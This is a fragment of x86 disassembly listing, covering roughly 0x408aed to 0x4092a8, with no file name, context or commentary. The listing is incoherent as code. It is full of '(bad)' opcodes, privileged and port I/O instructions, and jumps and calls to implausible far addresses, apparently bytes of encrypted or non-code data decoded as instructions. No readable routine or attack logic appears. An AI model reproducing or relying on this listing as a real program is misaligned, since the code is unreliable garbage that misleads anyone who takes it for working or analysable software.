  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0x6f0729ff,eax
  408b09:	gs add eax,0x7b7be5ea
  408b0f:	adc    ebx,DWORD PTR [ebx+edi*2-0x60e60e85]
  408b16:	jmp    0x408b86
  408b18:	sar    DWORD PTR [esi-0x64],1
  408b1b:	scas   al,BYTE PTR es:[edi]
  408b1c:	adc    al,BYTE PTR [edx-0x4c4f9887]
  408b22:	and    cl,BYTE PTR [esi]
  408b24:	nop
  408b25:	or     al,0xa8
  408b27:	mov    dh,0x2a
  408b29:	clc    
  408b2a:	mov    esi,0xa16d50c0
  408b2f:	cdq    
  408b30:	mov    edx,0x853a322c
  408b35:	pop    edx
  408b36:	cmp    eax,0xee618cb1
  408b3b:	ins    DWORD PTR es:[edi],dx
  408b3c:	lock iret 
  408b3e:	fcmovnb st,st(3)
  408b40:	and    BYTE PTR [edx-0x5f121bf1],dh
  408b46:	sbb    ecx,eax
  408b48:	mov    gs:0xb055ff6,al
  408b4e:	icebp  
  408b4f:	paddsb mm3,mm4
  408b52:	mov    ebp,DWORD PTR [edx+0x29aa7563]
  408b58:	popf   
  408b59:	loopne 0x408b17
  408b5b:	and    ah,BYTE PTR [eax]
  408b5d:	test   DWORD PTR [edx],edi
  408b5f:	out    0x8d,eax
  408b61:	jle    0x8484cda1
  408b67:	fimul  WORD PTR [ebx+0x61b1d3b2]
  408b6d:	fistp  QWORD PTR [eax-0x554f1654]
  408b73:	(bad)  
  408b75:	and    BYTE PTR [ecx],0x48
  408b78:	in     al,dx
  408b79:	and    al,0x45
  408b7b:	scas   al,BYTE PTR es:[edi]
  408b7c:	dec    esp
  408b7d:	mov    DWORD PTR [esi-0x7d],edx
  408b80:	inc    esp
  408b81:	adc    esi,ebp
  408b83:	jge    0x408b8c
  408b85:	xchg   BYTE PTR [edx+0x3e2ee45b],dh
  408b8b:	fdiv   st,st(4)
  408b8d:	and    dl,dl
  408b8f:	dec    edi
  408b90:	cmc    
  408b91:	test   eax,0xc4404ab6
  408b96:	lahf   
  408b97:	stos   BYTE PTR es:[edi],al
  408b98:	shr    DWORD PTR ds:0xa02eb507,0x9
  408b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ba0:	push   ss
  408ba1:	xchg   esp,eax
  408ba2:	repz xor esp,edi
  408ba5:	fist   DWORD PTR [edx+0x13240294]
  408bab:	xchg   edx,eax
  408bac:	push   eax
  408bad:	dec    esp
  408bae:	cmp    DWORD PTR [eax+edi*1+0x1c],ebx
  408bb2:	xchg   DWORD PTR [esp+edx*4+0x261b46bb],ebp
  408bb9:	(bad)  
  408bba:	push   ebx
  408bbb:	pop    edi
  408bbc:	pop    edi
  408bbd:	mov    DWORD PTR [ecx+0x712c4417],ebx
  408bc3:	fmul   st(3),st
  408bc5:	mov    ebx,0x9d0f22e8
  408bca:	pusha  
  408bcb:	add    al,0x6a
  408bcd:	mov    ebp,0x6e7da821
  408bd2:	pop    esi
  408bd3:	or     DWORD PTR [esp+eax*8],esp
  408bd6:	sbb    cl,BYTE PTR [ecx]
  408bd8:	sbb    al,0x17
  408bda:	push   0x80d6b23b
  408bdf:	outs   dx,DWORD PTR ds:[esi]
  408be0:	je     0x408b63
  408be2:	loopne 0x408bd6
  408be4:	mov    eax,0xe354a9cd
  408be9:	push   0x3f
  408beb:	sbb    bh,BYTE PTR [esi+0x7f]
  408bee:	jae    0x408c3d
  408bf0:	leave  
  408bf1:	inc    esp
  408bf2:	and    dh,BYTE PTR [edi]
  408bf4:	sub    eax,esp
  408bf6:	inc    eax
  408bf7:	xchg   ecx,eax
  408bf8:	aas    
  408bf9:	pusha  
  408bfa:	imul   ebp,DWORD PTR [edx-0x31519250],0x7f
  408c01:	pop    ebp
  408c02:	lahf   
  408c03:	stc    
  408c04:	jmp    0x408c75
  408c06:	dec    esi
  408c07:	add    dl,bh
  408c09:	jge    0x408be3
  408c0b:	test   al,0x99
  408c0d:	mov    ch,0xfc
  408c0f:	mov    al,0xd7
  408c11:	lock loop 0x408c3e
  408c14:	int3   
  408c15:	and    dh,BYTE PTR [ebx+edi*4+0x1a65a8d1]
  408c1c:	and    cl,BYTE PTR [edx+0xb]
  408c1f:	iret   
  408c20:	mov    BYTE PTR ds:0x59cc7848,ch
  408c26:	mov    BYTE PTR [esi],0xbd
  408c29:	int    0x9f
  408c2b:	adc    eax,0xbb76704
  408c30:	mov    eax,ds:0x7a759427
  408c35:	mov    eax,ds:0x5610feab
  408c3a:	push   0xa2efba92
  408c3f:	jne    0x408c9f
  408c41:	pop    ebx
  408c42:	fild   DWORD PTR [ecx]
  408c44:	js     0x408c2e
  408c46:	mov    eax,0x70ea195
  408c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c4c:	jb     0x408c9e
  408c4e:	std    
  408c4f:	test   al,0x1b
  408c51:	clc    
  408c52:	push   ds
  408c53:	sbb    ecx,esi
  408c55:	outs   dx,BYTE PTR ds:[esi]
  408c56:	xchg   DWORD PTR [ecx-0x1d],eax
  408c59:	loop   0x408c26
  408c5b:	in     al,0x99
  408c5d:	inc    DWORD PTR [edi]
  408c5f:	cmp    BYTE PTR ds:0x7b0a088c,ah
  408c65:	adc    BYTE PTR [edi*8-0x35cea156],dl
  408c6c:	push   ds
  408c6d:	and    ebp,DWORD PTR [ebx]
  408c6f:	mov    cl,0xf9
  408c71:	jg     0x408c72
  408c73:	es dec ebp
  408c75:	jno    0x408ccb
  408c77:	xchg   esi,eax
  408c78:	jle    0x408c0b
  408c7a:	adc    dl,al
  408c7c:	dec    ebx
  408c7d:	push   ebx
  408c7e:	call   0xc20f6dc9
  408c83:	push   0x66
  408c85:	jp     0x408cce
  408c87:	inc    esp
  408c88:	mov    bl,bh
  408c8a:	retf   
  408c8b:	xchg   esp,eax
  408c8c:	dec    esi
  408c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c8e:	cmp    bl,dh
  408c90:	xor    ch,BYTE PTR [edx+0x7c]
  408c93:	daa    
  408c94:	pop    esp
  408c95:	sub    dl,ch
  408c97:	es sbb al,0x63
  408c9a:	stos   BYTE PTR es:[edi],al
  408c9b:	push   ecx
  408c9c:	arpl   WORD PTR [edi],si
  408c9e:	data16 icebp 
  408ca0:	pop    edi
  408ca1:	xor    DWORD PTR [ecx+ebx*2-0x69b8fe0],edi
  408ca8:	rcr    DWORD PTR [ecx+ebp*1+0x121bddc6],0xca
  408cb0:	daa    
  408cb1:	pop    ebx
  408cb2:	lock push ss
  408cb4:	in     eax,0x4e
  408cb6:	sub    dl,BYTE PTR [ebx]
  408cb8:	mov    DWORD PTR [ecx-0x428765dc],ebx
  408cbe:	mov    bh,0x42
  408cc0:	out    dx,al
  408cc1:	fisub  DWORD PTR [edi]
  408cc3:	push   es
  408cc4:	repnz outs dx,BYTE PTR ds:[esi]
  408cc6:	cmp    ah,BYTE PTR [eax*8+0x67f83d1b]
  408ccd:	ficomp WORD PTR [eax]
  408ccf:	push   edi
  408cd0:	call   0x94ef03c
  408cd5:	sbb    al,0xf5
  408cd7:	mov    ebx,0xf3a61a5e
  408cdc:	jecxz  0x408d3f
  408cde:	ret    
  408cdf:	xor    al,0x2d
  408ce1:	adc    al,0x74
  408ce3:	fisttp QWORD PTR [eax+0x18]
  408ce6:	aam    0xd8
  408ce8:	aaa    
  408ce9:	addr16 inc esi
  408ceb:	inc    ecx
  408cec:	mul    DWORD PTR [edi+ebx*4+0x17e0ce0d]
  408cf3:	ds (bad) 
  408cf6:	sub    DWORD PTR [edi],eax
  408cf8:	scas   eax,DWORD PTR es:[edi]
  408cf9:	pop    ebx
  408cfa:	and    al,0x9d
  408cfc:	push   0x5b764703
  408d01:	cmp    al,0xd1
  408d03:	sub    BYTE PTR [ecx],bh
  408d05:	mov    dh,0xec
  408d07:	xor    BYTE PTR [edx],bh
  408d09:	push   cs
  408d0a:	fiadd  DWORD PTR [edi+0x69]
  408d0d:	adc    al,0x5c
  408d0f:	push   0xffffffaa
  408d11:	out    dx,eax
  408d12:	inc    ebp
  408d13:	cld    
  408d14:	inc    edi
  408d15:	and    ebx,DWORD PTR [ebx+eiz*4]
  408d18:	shr    BYTE PTR [edi-0x39bd9e33],0x96
  408d1f:	adc    eax,DWORD PTR [ebp+0x75c6948]
  408d25:	test   BYTE PTR [ebp+0xfbb2d6d],0xe8
  408d2c:	in     eax,0x6a
  408d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d2f:	dec    ecx
  408d30:	pmullw mm0,QWORD PTR [edx-0x4c1b3fe2]
  408d37:	add    DWORD PTR [esi-0x4df4ebcd],ebp
  408d3d:	pop    edi
  408d3e:	arpl   WORD PTR [ebx+0x3d],cx
  408d41:	ins    DWORD PTR es:[edi],dx
  408d42:	sub    DWORD PTR [eax+edi*4+0x783c5bb],edi
  408d49:	seto   BYTE PTR [ebx+0x30]
  408d4d:	push   ebx
  408d4e:	rcl    eax,0x1
  408d51:	pushf  
  408d52:	(bad)  
  408d53:	jmp    0xb491ed7c
  408d58:	mov    eax,ds:0x6df1116f
  408d5d:	inc    edx
  408d5e:	cmp    bl,BYTE PTR [edx]
  408d60:	push   0x1a
  408d62:	popf   
  408d63:	arpl   WORD PTR [eax-0x3d3ec8a2],ax
  408d69:	mov    al,0x13
  408d6b:	retf   
  408d6c:	fidivr WORD PTR [edx+0x67666cb2]
  408d72:	sub    ch,BYTE PTR es:[ebx]
  408d75:	icebp  
  408d76:	xchg   DWORD PTR [ebp+0x1d],ebp
  408d79:	mov    dl,0x1b
  408d7b:	inc    eax
  408d7c:	and    DWORD PTR [ecx+0x49],ebx
  408d7f:	lahf   
  408d80:	fbld   TBYTE PTR [eax+ecx*8]
  408d83:	xchg   ebx,eax
  408d84:	repnz and edi,edi
  408d87:	cli    
  408d88:	mov    ecx,0x9eb31389
  408d8d:	repz sbb eax,0x16160636
  408d93:	mov    al,ds:0x14632902
  408d98:	adc    eax,DWORD PTR [ecx]
  408d9a:	cld    
  408d9b:	or     eax,0xf221a998
  408da0:	push   es
  408da1:	cmp    bl,BYTE PTR [edi]
  408da3:	clc    
  408da4:	xlat   BYTE PTR ds:[ebx]
  408da5:	jge    0x408d59
  408da7:	test   eax,0x2492104b
  408dac:	scas   al,BYTE PTR es:[edi]
  408dad:	mov    al,0xac
  408daf:	cld    
  408db0:	inc    ecx
  408db1:	pusha  
  408db2:	push   esi
  408db3:	loopne 0x408dea
  408db5:	xchg   edx,eax
  408db6:	or     ch,0xbf
  408db9:	shl    ecx,cl
  408dbb:	xor    BYTE PTR [ecx-0x12ba35fd],bl
  408dc1:	call   0x8bff:0xb61291c7
  408dc8:	adc    DWORD PTR [ebx],esp
  408dca:	sahf   
  408dcb:	inc    esi
  408dcc:	retf   0xd9b4
  408dcf:	ins    DWORD PTR es:[edi],dx
  408dd0:	inc    esi
  408dd1:	xchg   ecx,eax
  408dd2:	push   ebp
  408dd3:	ins    BYTE PTR es:[edi],dx
  408dd4:	shl    eax,0x9d
  408dd7:	or     ebp,DWORD PTR [esi+0x49]
  408dda:	xchg   edx,eax
  408ddb:	jmp    0x6a23:0xcd6dccbc
  408de2:	cld    
  408de3:	rol    DWORD PTR [esi+0x52],1
  408de6:	outs   dx,BYTE PTR ds:[esi]
  408de7:	shl    DWORD PTR [edx+ebp*4-0x205f1338],1
  408dee:	lods   al,BYTE PTR ds:[esi]
  408def:	es mov dl,0x2a
  408df2:	jo     0x408d80
  408df4:	popf   
  408df5:	cmp    esi,DWORD PTR [ebx]
  408df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408df8:	xor    al,0x74
  408dfa:	mov    dl,0xad
  408dfc:	int3   
  408dfd:	into   
  408dfe:	pop    eax
  408dff:	inc    edx
  408e00:	imul   edx,DWORD PTR [ebp-0x3351dcd5],0x12aec5c5
  408e0a:	cmp    BYTE PTR [edi],0x9a
  408e0d:	pusha  
  408e0e:	fcomp  QWORD PTR [ecx+0x3682cfed]
  408e14:	ins    DWORD PTR es:[edi],dx
  408e15:	jb     0x408e56
  408e17:	scas   al,BYTE PTR es:[edi]
  408e18:	sbb    BYTE PTR [edx],ch
  408e1a:	lock aad 0x87
  408e1d:	add    DWORD PTR [ecx+0x4e],eax
  408e20:	mov    eax,ds:0xcc69579d
  408e25:	pusha  
  408e26:	push   ds
  408e27:	nop
  408e28:	pusha  
  408e29:	push   edx
  408e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e2b:	test   eax,0x7932ddb4
  408e30:	xor    eax,esi
  408e32:	adc    eax,DWORD PTR [eax-0xf]
  408e35:	mov    WORD PTR [ebx+0x4a],cs
  408e38:	and    esp,esi
  408e3a:	sub    bl,BYTE PTR [eax]
  408e3c:	dec    ecx
  408e3d:	mov    esi,0x735024d2
  408e42:	xor    bl,ch
  408e44:	idiv   BYTE PTR es:[ebp-0x69]
  408e48:	inc    ecx
  408e49:	popa   
  408e4a:	jecxz  0x408e92
  408e4c:	jo     0x408e7c
  408e4e:	fsub   st(7),st
  408e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e51:	inc    esi
  408e52:	lock sub al,0xe5
  408e55:	and    ecx,DWORD PTR [esi]
  408e57:	clc    
  408e58:	pusha  
  408e59:	cwde   
  408e5a:	lods   eax,DWORD PTR ds:[esi]
  408e5b:	push   es
  408e5c:	retf   
  408e5d:	fistp  DWORD PTR [ecx-0x150b1ce7]
  408e63:	adc    ecx,DWORD PTR [edx-0x34ba10cd]
  408e69:	icebp  
  408e6a:	and    BYTE PTR [edi],0x83
  408e6d:	sub    eax,0x5aa184c8
  408e72:	cdq    
  408e73:	push   ebx
  408e74:	sub    DWORD PTR [edx-0x1bb665d3],ebp
  408e7a:	push   0x30
  408e7c:	sbb    al,0x21
  408e7e:	push   eax
  408e7f:	mov    ds:0x6fcd3639,eax
  408e84:	shl    esp,cl
  408e86:	scas   al,BYTE PTR es:[edi]
  408e87:	jp     0x408e3e
  408e89:	xor    eax,0x1fdf4b1
  408e8e:	push   0xffffffbf
  408e90:	push   es
  408e91:	pusha  
  408e92:	call   0x37a1ba8c
  408e97:	out    dx,eax
  408e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e99:	cmp    al,BYTE PTR ds:0x10d4c8d6
  408e9f:	xchg   edx,eax
  408ea0:	add    BYTE PTR [eax],bl
  408ea2:	mov    dl,0x8c
  408ea4:	add    BYTE PTR [edi],bl
  408ea6:	enter  0x7d7c,0x90
  408eaa:	xchg   esp,eax
  408eab:	mov    ah,0x15
  408ead:	xor    esp,DWORD PTR [edi+edi*1+0xc468d1b]
  408eb4:	push   eax
  408eb5:	mov    ch,0x25
  408eb7:	sub    DWORD PTR [ebx-0x4a7639fa],0xffffffaf
  408ebe:	mul    DWORD PTR [eax]
  408ec0:	or     DWORD PTR [esi+ebx*1],ebx
  408ec3:	pop    ebx
  408ec4:	mov    DWORD PTR [ebp+ebx*2-0x5e],0x17f14ddd
  408ecc:	pop    edi
  408ecd:	mov    WORD PTR [edi],ds
  408ecf:	push   esi
  408ed0:	push   es
  408ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ed2:	stc    
  408ed3:	inc    edi
  408ed4:	adc    eax,0x5f656ee1
  408ed9:	mov    esi,0x5885172f
  408ede:	in     eax,0x14
  408ee0:	sub    al,0x7
  408ee2:	bound  esi,QWORD PTR [ebx-0x13cc817a]
  408ee8:	in     eax,dx
  408ee9:	jmp    0x408ec7
  408eeb:	outs   dx,DWORD PTR ds:[esi]
  408eec:	retf   0x5b1a
  408eef:	xchg   edx,eax
  408ef0:	loope  0x408f03
  408ef2:	jb     0x408e81
  408ef4:	inc    eax
  408ef5:	cld    
  408ef6:	mov    ebx,0x44f0467a
  408efb:	out    0xa5,eax
  408efd:	pop    ecx
  408efe:	and    BYTE PTR [ecx+0x75],al
  408f01:	sub    cl,bh
  408f03:	push   eax
  408f04:	das    
  408f05:	in     eax,0x17
  408f07:	and    eax,0x88f9f7ce
  408f0c:	mov    ch,0x29
  408f0e:	and    al,0x52
  408f10:	fidiv  DWORD PTR [ebx-0x6f]
  408f13:	inc    ebp
  408f14:	fwait
  408f15:	xor    DWORD PTR [ecx+0x79a233da],ecx
  408f1b:	mov    ds:0x7cd185d0,al
  408f20:	or     al,0x4f
  408f22:	ret    0xab5a
  408f25:	fnstenv [edi-0x4e28dcfe]
  408f2b:	and    DWORD PTR [esi+0x2c0e9b2c],esp
  408f31:	cmc    
  408f32:	push   edi
  408f33:	fisttp DWORD PTR [ecx]
  408f35:	test   DWORD PTR [edi+0x7a],ebx
  408f38:	lds    eax,FWORD PTR [edi+0x6563d26b]
  408f3e:	sbb    dl,BYTE PTR [esi+0x16f0e4fb]
  408f44:	jbe    0x408f21
  408f46:	lods   eax,DWORD PTR ds:[esi]
  408f47:	sbb    BYTE PTR [ecx-0x4c],cl
  408f4a:	add    al,0x31
  408f4c:	data16 lods al,BYTE PTR ds:[esi]
  408f4e:	add    dh,BYTE PTR [eax+ecx*8-0x3a]
  408f52:	jl     0x408f99
  408f54:	pop    ss
  408f55:	aam    0x8b
  408f57:	ds mov edx,0xed9e9564
  408f5d:	mov    ebp,0xeb70c34a
  408f62:	pop    eax
  408f63:	mov    bl,0xce
  408f65:	shl    DWORD PTR [esi-0x7c62a76a],0x3b
  408f6c:	cli    
  408f6d:	cmp    bl,dh
  408f6f:	jmp    0xb0114e8d
  408f74:	dec    eax
  408f75:	int3   
  408f76:	dec    ebx
  408f77:	std    
  408f78:	add    DWORD PTR [eax-0x30],edi
  408f7b:	mov    cl,bl
  408f7d:	dec    eax
  408f7e:	pop    ss
  408f7f:	lea    eax,[edx]
  408f81:	hlt    
  408f82:	ficomp DWORD PTR [esi-0x75]
  408f85:	outs   dx,BYTE PTR ds:[esi]
  408f86:	mov    eax,ds:0x2d891551
  408f8b:	test   DWORD PTR [esi+0x9],esp
  408f8e:	int    0x97
  408f90:	fstp   DWORD PTR [ebx+0x65746674]
  408f96:	add    al,BYTE PTR [ebx]
  408f98:	xor    eax,0x9c2e63e6
  408f9d:	mov    al,0x40
  408f9f:	inc    esp
  408fa0:	jnp    0x408fe6
  408fa2:	das    
  408fa3:	mov    cl,0xc9
  408fa5:	push   ebx
  408fa6:	jmp    0x1bda55b2
  408fab:	retf   
  408fac:	jl     0x408ff9
  408fae:	and    DWORD PTR [edx-0x1f23b46d],ebx
  408fb4:	into   
  408fb5:	add    esp,DWORD PTR [esi-0x5521bf9]
  408fbb:	dec    ebx
  408fbc:	hlt    
  408fbd:	les    ecx,FWORD PTR [edi-0x6]
  408fc0:	jg     0x409037
  408fc2:	jmp    0x429c1997
  408fc7:	push   0xffffffd6
  408fc9:	int    0xfe
  408fcb:	ror    BYTE PTR [ebp-0x50],cl
  408fce:	pop    ebx
  408fcf:	xchg   edx,eax
  408fd0:	retf   
  408fd1:	dec    edx
  408fd2:	push   edi
  408fd3:	cmp    eax,0x33ca64d4
  408fd8:	add    eax,0x7863e62d
  408fdd:	xor    eax,0xfa6e9c84
  408fe2:	lock mov al,es:0x2f0780c9
  408fe9:	jp     0x408f9b
  408feb:	xchg   esp,eax
  408fec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fed:	dec    ebp
  408fee:	out    dx,eax
  408fef:	push   ebx
  408ff0:	mov    dh,0x52
  408ff2:	aam    0xa3
  408ff4:	sub    al,0xf7
  408ff6:	ret    
  408ff7:	cmp    DWORD PTR [ebx],0x319bd016
  408ffd:	ins    BYTE PTR es:[edi],dx
  408ffe:	ficom  WORD PTR [edx+esi*1-0x6e]
  409002:	adc    al,0xe8
  409004:	push   esp
  409005:	sar    BYTE PTR [ebx-0x2d78ed58],1
  40900b:	mov    ecx,0x9c666f87
  409010:	lea    esp,[edx-0x1cfbf7fe]
  409016:	adc    BYTE PTR [edi+0x17],al
  409019:	inc    edx
  40901a:	mov    ch,0x25
  40901c:	jl     0x408ffa
  40901e:	fxtract 
  409020:	arpl   WORD PTR [esi+eax*8],sp
  409023:	das    
  409024:	(bad)  
  409025:	imul   esp,DWORD PTR ds:0xf507c4bb,0xd937779f
  40902f:	pop    esi
  409030:	fs ins BYTE PTR es:[edi],dx
  409032:	cdq    
  409033:	xchg   ecx,eax
  409034:	lds    eax,FWORD PTR ds:0xa94f6841
  40903a:	push   edx
  40903b:	pop    ds
  40903c:	fisubr DWORD PTR [ecx+ebx*2]
  40903f:	sbb    BYTE PTR [ebx+eiz*2+0x4d],bh
  409043:	icebp  
  409044:	scas   al,BYTE PTR es:[edi]
  409045:	xor    eax,0x71a2b74d
  40904a:	or     eax,0x7d562e17
  40904f:	repnz enter 0xa93c,0xb5
  409054:	in     eax,dx
  409055:	inc    ecx
  409056:	sbb    eax,0xe2088fec
  40905b:	popf   
  40905c:	dec    DWORD PTR [eax]
  40905e:	mov    ebx,0x15e3e274
  409063:	inc    ebp
  409064:	adc    eax,0xd629ea6
  409069:	mov    ecx,0xe61a8d9e
  40906e:	cld    
  40906f:	outs   dx,DWORD PTR ds:[esi]
  409070:	out    dx,eax
  409071:	in     eax,dx
  409072:	lods   al,BYTE PTR ds:[esi]
  409073:	je     0x409061
  409075:	add    eax,0xa4529d48
  40907a:	inc    ebp
  40907b:	dec    ebp
  40907c:	jmp    0x409044
  40907e:	push   ebp
  40907f:	test   DWORD PTR ds:0x89505e5c,ecx
  409085:	loop   0x4090d9
  409087:	jecxz  0x409105
  409089:	push   ebp
  40908a:	mov    bl,0x47
  40908c:	mov    ecx,DWORD PTR [edx+0x5a4f3c69]
  409092:	(bad)  
  409093:	jmp    0xb08981cd
  409098:	xchg   ebx,eax
  409099:	call   0x6f4691d9
  40909e:	fsubr  st,st(1)
  4090a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090a1:	push   ebx
  4090a2:	int3   
  4090a3:	jnp    0x4090c2
  4090a5:	cmp    ah,BYTE PTR [esi+0x3f6e5bbb]
  4090ab:	mov    ch,0xa5
  4090ad:	iret   
  4090ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090af:	ret    0x6471
  4090b2:	out    0x9,al
  4090b4:	xor    al,0x40
  4090b6:	mov    ds:0x57f63391,al
  4090bb:	loop   0x4090de
  4090bd:	mov    bl,0xfb
  4090bf:	pop    ecx
  4090c0:	mov    bl,0x22
  4090c2:	idiv   BYTE PTR [ebx+0x3c]
  4090c5:	cmp    BYTE PTR [edi+0x594c7e22],dl
  4090cb:	push   edi
  4090cc:	jle    0x4090a4
  4090ce:	cmp    eax,0x1a587299
  4090d3:	and    eax,0xb0dc523e
  4090d8:	scas   al,BYTE PTR es:[edi]
  4090d9:	push   cs
  4090da:	pop    edx
  4090db:	mov    dl,0x75
  4090dd:	mov    bl,0x99
  4090df:	adc    al,0x16
  4090e1:	rcl    esp,1
  4090e3:	sub    eax,DWORD PTR [esi+eax*4+0x1]
  4090e7:	push   ebp
  4090e8:	shr    DWORD PTR [edi-0xb31078d],cl
  4090ee:	mov    ch,0xcf
  4090f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090f1:	push   cs
  4090f2:	lods   al,BYTE PTR ds:[esi]
  4090f3:	inc    esp
  4090f4:	inc    ebp
  4090f5:	ror    DWORD PTR [esi+0x233395ed],cl
  4090fb:	push   ecx
  4090fc:	dec    esp
  4090fd:	jmp    0xb414:0xbe775a39
  409104:	call   0x2c5544be
  409109:	out    dx,al
  40910a:	xor    edi,edi
  40910c:	xchg   ebp,eax
  40910d:	lods   eax,DWORD PTR ds:[esi]
  40910e:	loope  0x409131
  409110:	imul   ecx,edi,0x50cfd821
  409116:	xchg   esi,eax
  409117:	(bad)  
  409118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409119:	adc    bl,BYTE PTR [esi-0x57]
  40911c:	lods   al,BYTE PTR ds:[esi]
  40911d:	out    dx,al
  40911e:	sub    DWORD PTR [ebx-0x65e04bf8],ecx
  409124:	std    
  409125:	(bad)  
  409126:	push   esp
  409127:	and    ch,ah
  409129:	ins    BYTE PTR es:[edi],dx
  40912a:	fidiv  WORD PTR [edi+ecx*1-0x86dce9]
  409131:	cmp    DWORD PTR ds:0xa45fd0b4,ecx
  409137:	arpl   WORD PTR [ebp-0x3bf11da3],bp
  40913d:	gs fwait
  40913f:	pusha  
  409140:	or     edi,DWORD PTR [esi-0x3d]
  409143:	outs   dx,DWORD PTR ds:[esi]
  409144:	retf   0x6e4d
  409147:	mov    eax,ds:0x9a477d8f
  40914c:	loope  0x40910c
  40914e:	inc    edx
  40914f:	and    BYTE PTR [edi-0x5e],0x31
  409153:	add    DWORD PTR [ebp-0x51],ecx
  409156:	in     al,dx
  409157:	ds cdq 
  409159:	hlt    
  40915a:	cmc    
  40915b:	dec    edi
  40915c:	hlt    
  40915d:	and    DWORD PTR [edx+0x14],edx
  409160:	mov    dh,0x6d
  409162:	pop    ebp
  409163:	sub    DWORD PTR [ebx+0x355bd738],edx
  409169:	aaa    
  40916a:	add    DWORD PTR [ecx+0x66eebeec],0x182572b6
  409174:	add    al,cl
  409176:	lahf   
  409177:	mov    edx,0x6dc448be
  40917c:	jmp    0x4ea8496d
  409181:	dec    eax
  409182:	std    
  409183:	ss dec edx
  409185:	jl     0x40912a
  409187:	jge    0x4091be
  409189:	inc    ecx
  40918a:	ss (bad) 
  40918c:	lods   al,BYTE PTR ds:[esi]
  40918d:	mov    esi,0x6a5c7d8c
  409192:	test   al,0x36
  409194:	cmp    BYTE PTR [esi],ah
  409196:	jns    0x40919c
  409198:	push   cs
  409199:	mov    ecx,0x975a843c
  40919e:	loopne 0x409216
  4091a0:	mov    ebp,0x4256360c
  4091a5:	or     al,0x20
  4091a7:	mov    ?,WORD PTR [ecx+eiz*4-0x78]
  4091ab:	mov    dl,0xf7
  4091ad:	daa    
  4091ae:	cmp    DWORD PTR [ecx],edi
  4091b0:	adc    ebx,0xffffff9c
  4091b3:	fnstsw WORD PTR [edi]
  4091b5:	mov    eax,0xdf7d41d
  4091ba:	aad    0xb4
  4091bc:	push   edx
  4091bd:	daa    
  4091be:	push   esi
  4091bf:	jle    0x40920b
  4091c1:	idiv   bl
  4091c3:	push   ecx
  4091c4:	retf   
  4091c5:	pusha  
  4091c6:	and    al,0xb7
  4091c8:	or     dh,BYTE PTR [edi-0x73]
  4091cb:	popa   
  4091cc:	cmc    
  4091cd:	adc    ah,BYTE PTR [eax+0x6af934ac]
  4091d3:	adc    edi,DWORD PTR [esi+0x7e]
  4091d6:	mov    ds:0x3d20f530,eax
  4091db:	test   al,0x6a
  4091dd:	repnz bound esp,QWORD PTR [esi-0x14388d76]
  4091e4:	sub    ebx,edi
  4091e6:	cmp    al,0xe3
  4091e8:	daa    
  4091e9:	repz aas 
  4091eb:	and    DWORD PTR [ebp+0x5d],0x4fa7103d
  4091f2:	dec    esi
  4091f3:	stos   DWORD PTR es:[edi],eax
  4091f4:	ins    DWORD PTR es:[edi],dx
  4091f5:	stc    
  4091f6:	fimul  DWORD PTR [esi+0x67f407e3]
  4091fc:	inc    ecx
  4091fd:	and    al,BYTE PTR [ecx]
  4091ff:	in     eax,dx
  409200:	fidivr DWORD PTR [ecx-0x6f]
  409203:	jbe    0x4091d5
  409205:	and    ebp,DWORD PTR [ebp-0x25]
  409208:	push   edx
  409209:	ja     0x4091c4
  40920b:	aaa    
  40920c:	test   DWORD PTR [edx+0x61b9cd90],ebx
  409212:	push   cs
  409213:	mov    al,ds:0x9324b5cf
  409218:	repnz xor DWORD PTR [ebx+0x4b55acb8],0x732171c1
  409223:	mov    DWORD PTR [edi],esi
  409225:	push   ds
  409226:	mov    esi,0xe33c3aec
  40922b:	test   DWORD PTR ds:0xc9d4efa8,ebp
  409231:	cmp    dh,bl
  409233:	popf   
  409234:	push   esp
  409235:	leave  
  409236:	sub    al,BYTE PTR [ecx+0x6b]
  409239:	jns    0x4091cd
  40923b:	xor    DWORD PTR [edx+0x38],edi
  40923e:	inc    ebp
  40923f:	mov    ds:0x54260138,eax
  409244:	out    dx,al
  409245:	and    eax,0xc2454c0a
  40924a:	js     0x4091da
  40924c:	sbb    eax,0x50c60080
  409251:	imul   edi,DWORD PTR [edi+edx*1],0xffffffa8
  409255:	sub    eax,esp
  409257:	and    esi,DWORD PTR [edi-0x1fd7f978]
  40925d:	popa   
  40925e:	enter  0xf335,0x8d
  409262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409263:	das    
  409264:	(bad)  
  409265:	jb     0x409243
  409267:	mov    ch,ah
  409269:	sub    eax,0xb57cb85
  40926e:	dec    ebp
  40926f:	dec    eax
  409270:	(bad)  
  409271:	test   ebx,0xd7da1a23
  409277:	sbb    al,0xfb
  40927a:	fistp  DWORD PTR [ebx+esi*4]
  40927d:	mov    ch,0xa8
  40927f:	dec    ebp
  409280:	sub    cl,ah
  409282:	rol    BYTE PTR [ebx],cl
  409284:	dec    ecx
  409285:	dec    edx
  409286:	test   eax,0x634cb240
  40928b:	jnp    0x409239
  40928d:	xor    esp,0xd6d66648
  409293:	and    al,dl
  409295:	pop    esp
  409296:	inc    ebp
  409297:	stos   DWORD PTR es:[edi],eax
  409298:	out    dx,eax
  409299:	xchg   esi,eax
  40929a:	lods   al,BYTE PTR ds:[esi]
  40929b:	retf   0xbafe
  40929e:	inc    edi
  40929f:	jmp    0x5c31:0xf5341337
  4092a6:	cdq    
  4092a7:	inc    ecx
  4092a8:	shr    ebx,cl
